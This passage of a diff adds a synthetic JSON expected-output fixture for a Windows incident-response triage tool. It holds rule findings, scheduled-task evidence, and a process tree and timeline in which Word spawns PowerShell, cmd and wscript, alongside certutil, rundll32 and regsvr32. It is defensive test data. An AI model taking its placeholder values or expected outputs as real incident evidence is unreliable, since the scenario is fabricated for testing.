+            "field": "actions[0].executable",
+            "value": "C:\\Users\\ExampleUser\\AppData\\Roaming\\ExampleVendor\\scheduled.exe",
+            "explanation": "Original separately collected task executable field."
+          },
+          {
+            "artifact_id": "00000000-0000-0000-0000-000000000006",
+            "field": "actions[1].executable",
+            "value": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "explanation": "Original separately collected task executable field."
+          },
+          {
+            "artifact_id": "00000000-0000-0000-0000-000000000006",
+            "field": "actions[0].arguments",
+            "value": "--synthetic",
+            "explanation": "Original task argument string; it was not executed."
+          },
+          {
+            "artifact_id": "00000000-0000-0000-0000-000000000006",
+            "field": "actions[1].arguments",
+            "value": "-NoProfile -File \"C:\\Users\\ExampleUser\\AppData\\Local\\Temp\\example script.ps1\"",
+            "explanation": "Original task argument string; it was not executed."
+          },
+          {
+            "artifact_id": "00000000-0000-0000-0000-000000000006",
+            "field": "actions[0].target",
+            "value": "C:\\Users\\ExampleUser\\AppData\\Roaming\\ExampleVendor\\scheduled.exe",
+            "explanation": "The explicit executable or supported script target retained from evidence."
+          },
+          {
+            "artifact_id": "00000000-0000-0000-0000-000000000006",
+            "field": "actions[1].target",
+            "value": "C:\\Users\\ExampleUser\\AppData\\Local\\Temp\\example script.ps1",
+            "explanation": "The explicit executable or supported script target retained from evidence."
+          },
+          {
+            "artifact_id": "00000000-0000-0000-0000-000000000006",
+            "field": "actions[0].target_provenance",
+            "value": "task_action_executable",
+            "explanation": "The parser records how the target was obtained without executing it."
+          },
+          {
+            "artifact_id": "00000000-0000-0000-0000-000000000006",
+            "field": "actions[1].target_provenance",
+            "value": "powershell_file",
+            "explanation": "The parser records how the target was obtained without executing it."
+          },
+          {
+            "artifact_id": "00000000-0000-0000-0000-000000000006",
+            "field": "actions[0].index",
+            "value": 0,
+            "explanation": "Zero-based index of this matching action in captured order."
+          },
+          {
+            "artifact_id": "00000000-0000-0000-0000-000000000006",
+            "field": "actions[1].index",
+            "value": 1,
+            "explanation": "Zero-based index of this matching action in captured order."
+          }
+        ],
+        "mitre_technique": null
+      },
+      {
+        "finding_id": "d40d5751-659b-5fea-ba66-5c28818bd2c3",
+        "rule_id": "IRS-P007",
+        "title": "Process executable in AppData",
+        "severity": "low",
+        "description": "The captured executable is in AppData, outside the conventional Local AppData Programs subtree and any more-specific TEMP classification. Legitimate per-user applications commonly use AppData; this lexical heuristic does not measure trust or ACLs.",
+        "artifact_ids": [
+          "00000000-0000-0000-0000-000000000597"
+        ],
+        "pids": [
+          431
+        ],
+        "evidence": [
+          {
+            "artifact_id": "00000000-0000-0000-0000-000000000597",
+            "field": "executable",
+            "value": "C:\\Users\\ExampleUser\\AppData\\Roaming\\ExampleVendor\\example-agent.exe",
+            "explanation": "Captured executable path required by this location rule."
+          },
+          {
+            "artifact_id": "00000000-0000-0000-0000-000000000597",
+            "field": "path_basis",
+            "value": "The normalized path is within a captured appdata root; this is a lexical location hint, not an ACL or trust decision.",
+            "explanation": "Classifier basis; this makes no ACL, trust, or existence claim."
+          },
+          {
+            "artifact_id": "00000000-0000-0000-0000-000000000597",
+            "field": "normalized_path",
+            "value": "c:\\users\\exampleuser\\appdata\\roaming\\examplevendor\\example-agent.exe",
+            "explanation": "Lexically normalized Windows path derived only from captured context."
+          }
+        ],
+        "mitre_technique": null
+      }
+    ],
+    "process_tree": {
+      "nodes": [
+        {
+          "process_id": "00000000-0000-0000-0000-000000000578",
+          "parent_id": null,
+          "child_ids": [
+            "00000000-0000-0000-0000-000000000582",
+            "00000000-0000-0000-0000-000000000596",
+            "00000000-0000-0000-0000-000000000597",
+            "00000000-0000-0000-0000-0000000005a0",
+            "00000000-0000-0000-0000-0000000005a1",
+            "00000000-0000-0000-0000-0000000005a2"
+          ],
+          "parent_status": "missing"
+        },
+        {
+          "process_id": "00000000-0000-0000-0000-000000000582",
+          "parent_id": "00000000-0000-0000-0000-000000000578",
+          "child_ids": [
+            "00000000-0000-0000-0000-00000000058c",
+            "00000000-0000-0000-0000-00000000058d",
+            "00000000-0000-0000-0000-00000000058e"
+          ],
+          "parent_status": "linked"
+        },
+        {
+          "process_id": "00000000-0000-0000-0000-00000000058c",
+          "parent_id": "00000000-0000-0000-0000-000000000582",
+          "child_ids": [],
+          "parent_status": "linked"
+        },
+        {
+          "process_id": "00000000-0000-0000-0000-00000000058d",
+          "parent_id": "00000000-0000-0000-0000-000000000582",
+          "child_ids": [],
+          "parent_status": "linked"
+        },
+        {
+          "process_id": "00000000-0000-0000-0000-00000000058e",
+          "parent_id": "00000000-0000-0000-0000-000000000582",
+          "child_ids": [],
+          "parent_status": "linked"
+        },
+        {
+          "process_id": "00000000-0000-0000-0000-000000000596",
+          "parent_id": "00000000-0000-0000-0000-000000000578",
+          "child_ids": [],
+          "parent_status": "linked"
+        },
+        {
+          "process_id": "00000000-0000-0000-0000-000000000597",
+          "parent_id": "00000000-0000-0000-0000-000000000578",
+          "child_ids": [],
+          "parent_status": "linked"
+        },
+        {
+          "process_id": "00000000-0000-0000-0000-0000000005a0",
+          "parent_id": "00000000-0000-0000-0000-000000000578",
+          "child_ids": [],
+          "parent_status": "linked"
+        },
+        {
+          "process_id": "00000000-0000-0000-0000-0000000005a1",
+          "parent_id": "00000000-0000-0000-0000-000000000578",
+          "child_ids": [],
+          "parent_status": "linked"
+        },
+        {
+          "process_id": "00000000-0000-0000-0000-0000000005a2",
+          "parent_id": "00000000-0000-0000-0000-000000000578",
+          "child_ids": [],
+          "parent_status": "linked"
+        }
+      ],
+      "root_ids": [
+        "00000000-0000-0000-0000-000000000578"
+      ]
+    },
+    "network_links": [],
+    "finding_context": [
+      {
+        "finding_id": "268e5ec8-2180-5764-a0dd-9ba61d980e48",
+        "process_ids": [
+          "00000000-0000-0000-0000-0000000005a0"
+        ],
+        "ancestor_ids": [
+          "00000000-0000-0000-0000-000000000578"
+        ],
+        "child_ids": [],
+        "connection_ids": []
+      },
+      {
+        "finding_id": "3412a101-2845-5107-9935-047196c427e6",
+        "process_ids": [],
+        "ancestor_ids": [],
+        "child_ids": [],
+        "connection_ids": []
+      },
+      {
+        "finding_id": "3a4512c4-5fe0-5eb3-bd68-64a17fab0bba",
+        "process_ids": [
+          "00000000-0000-0000-0000-0000000005a1"
+        ],
+        "ancestor_ids": [
+          "00000000-0000-0000-0000-000000000578"
+        ],
+        "child_ids": [],
+        "connection_ids": []
+      },
+      {
+        "finding_id": "3f9c0ab6-6e28-5afd-854a-6e6746f658c4",
+        "process_ids": [
+          "00000000-0000-0000-0000-000000000596"
+        ],
+        "ancestor_ids": [
+          "00000000-0000-0000-0000-000000000578"
+        ],
+        "child_ids": [],
+        "connection_ids": []
+      },
+      {
+        "finding_id": "4e656e63-016d-54d9-8eab-8cf38283c92a",
+        "process_ids": [
+          "00000000-0000-0000-0000-000000000582",
+          "00000000-0000-0000-0000-00000000058c"
+        ],
+        "ancestor_ids": [
+          "00000000-0000-0000-0000-000000000578"
+        ],
+        "child_ids": [
+          "00000000-0000-0000-0000-00000000058d",
+          "00000000-0000-0000-0000-00000000058e"
+        ],
+        "connection_ids": []
+      },
+      {
+        "finding_id": "82825a4d-5611-5247-b235-e3fcfce02a85",
+        "process_ids": [],
+        "ancestor_ids": [],
+        "child_ids": [],
+        "connection_ids": []
+      },
+      {
+        "finding_id": "87bd0b77-ac59-539a-a23f-7319bc845375",
+        "process_ids": [
+          "00000000-0000-0000-0000-0000000005a2"
+        ],
+        "ancestor_ids": [
+          "00000000-0000-0000-0000-000000000578"
+        ],
+        "child_ids": [],
+        "connection_ids": []
+      },
+      {
+        "finding_id": "88ddbb83-0acb-5b9c-9010-e917391a380c",
+        "process_ids": [
+          "00000000-0000-0000-0000-000000000582",
+          "00000000-0000-0000-0000-00000000058e"
+        ],
+        "ancestor_ids": [
+          "00000000-0000-0000-0000-000000000578"
+        ],
+        "child_ids": [
+          "00000000-0000-0000-0000-00000000058c",
+          "00000000-0000-0000-0000-00000000058d"
+        ],
+        "connection_ids": []
+      },
+      {
+        "finding_id": "9b3adc97-9c46-55d7-82d8-bf20872ce78a",
+        "process_ids": [
+          "00000000-0000-0000-0000-000000000582",
+          "00000000-0000-0000-0000-00000000058d"
+        ],
+        "ancestor_ids": [
+          "00000000-0000-0000-0000-000000000578"
+        ],
+        "child_ids": [
+          "00000000-0000-0000-0000-00000000058c",
+          "00000000-0000-0000-0000-00000000058e"
+        ],
+        "connection_ids": []
+      },
+      {
+        "finding_id": "a58a7be7-0f54-5b6e-bafa-a1ee8782f40e",
+        "process_ids": [],
+        "ancestor_ids": [],
+        "child_ids": [],
+        "connection_ids": []
+      },
+      {
+        "finding_id": "d40d5751-659b-5fea-ba66-5c28818bd2c3",
+        "process_ids": [
+          "00000000-0000-0000-0000-000000000597"
+        ],
+        "ancestor_ids": [
+          "00000000-0000-0000-0000-000000000578"
+        ],
+        "child_ids": [],
+        "connection_ids": []
+      }
+    ],
+    "timeline": [
+      {
+        "timestamp": "2026-09-17T14:00:00Z",
+        "kind": "process_start",
+        "basis": "reported",
+        "description": "Process started: explorer.exe (PID 400)",
+        "artifact_ids": [
+          "00000000-0000-0000-0000-000000000578"
+        ]
+      },
+      {
+        "timestamp": "2026-09-17T14:00:01Z",
+        "kind": "process_start",
+        "basis": "reported",
+        "description": "Process started: WINWORD.EXE (PID 410)",
+        "artifact_ids": [
+          "00000000-0000-0000-0000-000000000582"
+        ]
+      },
+      {
+        "timestamp": "2026-09-17T14:00:02Z",
+        "kind": "process_start",
+        "basis": "reported",
+        "description": "Process started: powershell.exe (PID 420)",
+        "artifact_ids": [
+          "00000000-0000-0000-0000-00000000058c"
+        ]
+      },
+      {
+        "timestamp": "2026-09-17T14:00:03Z",
+        "kind": "process_start",
+        "basis": "reported",
+        "description": "Process started: cmd.exe (PID 421)",
+        "artifact_ids": [
+          "00000000-0000-0000-0000-00000000058d"
+        ]
+      },
+      {
+        "timestamp": "2026-09-17T14:00:04Z",
+        "kind": "process_start",
+        "basis": "reported",
+        "description": "Process started: wscript.exe (PID 422)",
+        "artifact_ids": [
+          "00000000-0000-0000-0000-00000000058e"
+        ]
+      },
+      {
+        "timestamp": "2026-09-17T14:00:05Z",
+        "kind": "process_start",
+        "basis": "reported",
+        "description": "Process started: example-installer.exe (PID 430)",
+        "artifact_ids": [
+          "00000000-0000-0000-0000-000000000596"
+        ]
+      },
+      {
+        "timestamp": "2026-09-17T14:00:06Z",
+        "kind": "process_start",
+        "basis": "reported",
+        "description": "Process started: example-agent.exe (PID 431)",
+        "artifact_ids": [
+          "00000000-0000-0000-0000-000000000597"
+        ]
+      },
+      {
+        "timestamp": "2026-09-17T14:00:07Z",
+        "kind": "process_start",
+        "basis": "reported",
+        "description": "Process started: certutil.exe (PID 440)",
+        "artifact_ids": [
+          "00000000-0000-0000-0000-0000000005a0"
+        ]
+      },
+      {
+        "timestamp": "2026-09-17T14:00:08Z",
+        "kind": "process_start",
+        "basis": "reported",
+        "description": "Process started: rundll32.exe (PID 441)",
+        "artifact_ids": [
+          "00000000-0000-0000-0000-0000000005a1"
+        ]
+      },
+      {
+        "timestamp": "2026-09-17T14:00:09Z",
+        "kind": "process_start",
+        "basis": "reported",
+        "description": "Process started: regsvr32.exe (PID 442)",
+        "artifact_ids": [
+          "00000000-0000-0000-0000-0000000005a2"
+        ]
+      },
+      {
+        "timestamp": "2026-09-17T14:05:00Z",
+        "kind": "collection_start",
+        "basis": "observed",
+        "description": "Collection started",
+        "artifact_ids": []
+      },
+      {
+        "timestamp": "2026-09-17T14:05:10Z",
+        "kind": "collection_end",
+        "basis": "observed",
+        "description": "Collection finished",
+        "artifact_ids": []
+      }
+    ],
+    "issues": []
+  }
+}
